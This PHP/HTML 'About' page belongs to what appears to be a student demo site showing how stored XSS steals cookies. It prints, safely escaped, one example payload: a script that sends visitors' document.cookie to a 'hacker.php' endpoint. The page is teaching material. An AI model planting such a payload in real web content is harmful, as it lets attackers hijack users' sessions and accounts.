<!DOCTYPE html>
<html>
<head>
	<title>Don't hack me</title>
	<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
	<link rel="stylesheet" type="text/css" href="css/global.css">

</head>
<body style="text-align: center; background-color: #E5E5E5">
	<?php include 'navbar.php' ?> <br>
	<div class="container">

		<h1>About</h1><br>
		<p class="left-mar">This website simulates how stored xss can get your information</p>
		<br>

		<h1>How it works</h1>
		<h2 class="left-mar">What if this happen</h2>
		<p class="left-mar">
			A hacker want to stole users' information on your blogging app, he register an account. Somehow he know the informations he want to get is stored in cookie, and he can get this cookie by manipulating an xss vulnerability by writing some post with content like <?php $code = "<script>location.href='hacker.php?cookie='+document.cookie</script>"; echo '<code>' . htmlspecialchars($code) . '</code>'; ?>. By this way, any user accesses this blog page will send the information hacker want.
		</p>
		<br>
		<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
		<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-Fy6S3B9q64WdZWQUiU+q4/2Lc9npb8tCaSX9FK7E8HnRr0Jz8D6OP9dO5Vg3Q9ct" crossorigin="anonymous"></script>
	</div>
	
</body>
</html>